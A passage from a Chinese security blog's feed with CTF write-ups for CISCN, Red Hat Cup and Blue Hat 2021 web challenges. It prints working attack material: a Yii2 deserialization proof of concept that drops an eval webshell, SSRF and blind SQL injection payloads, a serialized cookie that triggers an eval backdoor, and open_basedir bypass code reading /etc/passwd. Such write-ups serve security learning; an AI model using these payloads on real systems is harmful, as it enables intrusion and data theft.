punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e4<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c4<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N4<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>得到的16进制转md5即为flag值：</p><img src="/article/ciscn2021/image-20210517144130169.png" class="" title="image-20210517144130169" loading="lazy">]]></content>
    
    
    <summary type="html">&lt;p&gt;Ciscn 2021&lt;/p&gt;
&lt;p&gt;队伍名称：S3C_2021&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
  </entry>
  
  <entry>
    <title>红帽杯2021</title>
    <link href="https://err0r.top/article/redhat2021/"/>
    <id>https://err0r.top/article/redhat2021/</id>
    <published>2021-05-09T12:43:09.000Z</published>
    <updated>2021-06-06T13:33:56.821Z</updated>
    
    <content type="html"><![CDATA[<p>Web体验还行，不是太难，压轴题很合理</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>题目没啥意思23333，还老是503</p><p>扫下目录，访问<code>robots.txt</code> ，得到<code>1ndexx.php</code>，访问页面500报错，应该是缺参数，既然这样那肯定要给源码(不然寄刀片伺候)</p><p>发现备份文件<code>.1ndexx.php.swp</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment">#Really easy...</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"hack.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了一堆函数，先看看phpinfo</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">./?code=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>访问<code>hack.php</code></p><p>搜索字符串，结果发现flag写在了环境变量里，被phpinfo暴露出来了</p><img src="/article/redhat2021/image-20210509205559176.png" class="" title="web1flag" loading="lazy"><p>说实话，<code>1ndexx.php</code>和<code>index.php</code> 切换迷惑人，然后平台的问题，盲猜docker分发写环境变量，最后没删23333</p><hr><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p>扫到<code>www.zip</code>，看下是<a href="http://github.com/yiisoft/yii2/">Yii Framework2.0.32</a></p><p>去官网下原版比对一下，发现就改了个参数</p><h4 id="Yii2反序列化漏洞"><a href="#Yii2反序列化漏洞" class="headerlink" title="Yii2反序列化漏洞"></a><a href="https://www.cnblogs.com/thresh/p/13743081.html">Yii2反序列化漏洞</a></h4><p>拿poc直接打，由于base64后可能会有<code>/</code>或者<code>+</code>等，所以先base64一下写函数解码即可</p><p>system似乎被ban了不行</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'assert'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"file_put_contents('1.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbYV0pPz4='))"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 这里需要改为isRunning</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// poc2</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 生成poc</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>这里原poc打的参数是data，这里修改为message</p><img src="/article/redhat2021/image-20210509210754051.png" class="" title="message" loading="lazy"><p>打过去就行，虽然报错但是已经执行了</p><img src="/article/redhat2021/36771C01-40D6-4C62-A2C3-A38B1D6CE696.png" class="" title="poc" loading="lazy"><p>在当前目录会生成<code>1.php</code>，蚁剑连一下</p><img src="/article/redhat2021/image-20210509211521847.png" class="" title="getshell" loading="lazy"><p>发现有disable_function，当时心凉一截，不会和蓝帽一样…</p><p>侥幸心理测了下蚁剑的突破插件，发现<code>Apache_mod_cgi</code>可以，执行根目录下<code>/readflag</code>即可</p><img src="/article/redhat2021/image-20210509211350611.png" class="" title="web2flag" loading="lazy"><hr><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p>打开登陆界面，估计是注入</p><p>看看连接，发现异常请求，还好没上来对着<code>username</code>乱试</p><img src="/article/redhat2021/image-20210509212002489.png" class="" title="imagephp" loading="lazy"><p>经测试，可以使用异或 盲注</p><pre class="language-none"><code class="language-none">错误语句返回报错正确语句错误表达返回：WHAT ARE YOU DOING正确语句id为1返回图片正确语句id为0返回空</code></pre><img src="/article/redhat2021/image-20210509212509022.png" class="" title="1^1" loading="lazy"><img src="/article/redhat2021/image-20210509212527090.png" class="" title="1^0" loading="lazy"><img src="/article/redhat2021/image-20210509212645414.png" class="" title="error" loading="lazy"><p>异或盲注脚本跑，可见以前写的WP</p><p>拿到信息如下</p><pre class="language-none"><code class="language-none"># version&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;5.5.60-0+deb8u1# databases&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;ctf# tables&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;images,users# users.columns&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;username,password# users.data&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;admin~a1d4f79c94f0cd3feeac4</code></pre><p>似乎密码还是容器随机的，拿到用户名密码登陆</p><img src="/article/redhat2021/image-20210509213045341.png" class="" title="ssrf" loading="lazy"><p>明显ssrf，用file协议读一下文件可行，直接读flag</p><p>payload：</p><pre class="language-none"><code class="language-none">file:&#x2F;&#x2F;&#x2F;flag</code></pre><img src="/article/redhat2021/image-20210509213219524.png" class="" title="web3flag" loading="lazy">]]></content>
    
    
    <summary type="html">&lt;p&gt;Web体验还行，不是太难，压轴题很合理&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
  </entry>
  
  <entry>
    <title>蓝帽杯2021一道题——One_Pointer_PHP</title>
    <link href="https://err0r.top/article/bluehat2021/"/>
    <id>https://err0r.top/article/bluehat2021/</id>
    <published>2021-05-02T05:04:27.000Z</published>
    <updated>2021-05-03T07:48:09.206Z</updated>
    
    <content type="html"><![CDATA[<p>深入学习蓝帽杯web一道题</p><a id="more"></a><p>质量很高的一道题，详细写下做个总结，深入学习一下知识点</p><h2 id="WEB-One-Pointer-PHP"><a href="#WEB-One-Pointer-PHP" class="headerlink" title="WEB-One_Pointer_PHP"></a>WEB-One_Pointer_PHP</h2><h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><p>给了<code>www.zip</code>，部分源码，分析一下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>反序列化<code>cookies-&gt;data</code>使其$count[++$user-&gt;count]=1;后<code>$count[]=1</code>为false即可eval执行命令，伴随应该题目还有更多考点，测试如下。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span> <span class="token operator">=</span> <span class="token number">9223372036854775806</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"die"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><img src="/article/bluehat2021/image-20210503132210543.png" class="" title="count-test" loading="lazy"><p>在 PHP 中，有三种数组类型：</p><ul><li><p>索引数组 - 带有数字索引的数组</p><p> <code>$a = array(&quot;1&quot; =&gt; &quot;admin&quot;, &quot;0&quot; =&gt; &quot;gyy&quot;);</code>  // key被双引号包裹</p></li><li><p>关联数组 - 带有指定键的数组</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token number">9223372036854775805</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$key</span><span class="token punctuation">&#125;</span></span> => <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$value</span><span class="token punctuation">&#125;</span></span>\r\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$value</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 结果如下</span><span class="token comment">//array(3) &#123;</span><span class="token comment">//    [9223372036854775806]=></span><span class="token comment">//  int(1)</span><span class="token comment">//  [9223372036854775807]=></span><span class="token comment">//  int(1)</span><span class="token comment">//  [-9223372036854775808]=></span><span class="token comment">//  int(1)</span><span class="token comment">//&#125;</span><span class="token comment">//9223372036854775806 => 1</span><span class="token comment">//9223372036854775807 => 1</span><span class="token comment">//-9223372036854775808 => 1</span><span class="token comment">//bool(true)</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>多维数组 - 包含一个或多个数组的数组</p><p>俗称套娃</p></li></ul><p>感兴趣的师傅可以自己测试一下，这里只需要<code>$a-&gt;count=9223372036854775806</code>即long最大值时即可绕过(64位即2^64)</p><h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><p>直接拿shell进去看看</p><img src="/article/bluehat2021/image-20210503134715662.png" class="" title="shell" loading="lazy"><p>这里用蚁剑示例，注意header里需要加Cookie为<code>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D;</code></p><p>查看phpinfo，发现有很多disable_function</p><pre class="language-none"><code class="language-none">disable_function：stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursivedisable_classes:Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</code></pre><p>还有open_basedir限制，利用自动化脚本无法突破。由于html目录可写，利用<code>glob://</code>协议先探测目录</p><blockquote><p>glob:// — 查找匹配的文件路径模式</p></blockquote><pre class="language-none"><code class="language-none">&lt;?phpprintf(&#39;&lt;b&gt;open_basedir : %s &lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&#39;, ini_get(&#39;open_basedir&#39;));$file_list &#x3D; array();&#x2F;&#x2F; normal files$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($it as $f) &#123;    $file_list[] &#x3D; $f-&gt;__toString();&#125;&#x2F;&#x2F; special files (starting with a dot(.))$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;.*&quot;);foreach($it as $f) &#123;    $file_list[] &#x3D; $f-&gt;__toString();&#125;sort($file_list);foreach($file_list as $f)&#123;        echo &quot;&#123;$f&#125;&lt;br&#x2F;&gt;&quot;;&#125;?&gt;</code></pre><img src="/article/bluehat2021/image-20210503135244699.png" class="" title="flag" loading="lazy"><p>再利用如下，读取文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>读取php.ini</p><p><code> /usr/local/etc/php/php.ini</code></p><img src="/article/bluehat2021/image-20210503140055221.png" class="" title="ext" loading="lazy"><p>发现异常.so文件，可能是要加载然后pwn它，实在不会。</p><h3 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;b>open_basedir : %s &lt;/b>&lt;br />'</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// normal files</span><span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"glob:///etc/nginx/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token operator">-</span><span class="token 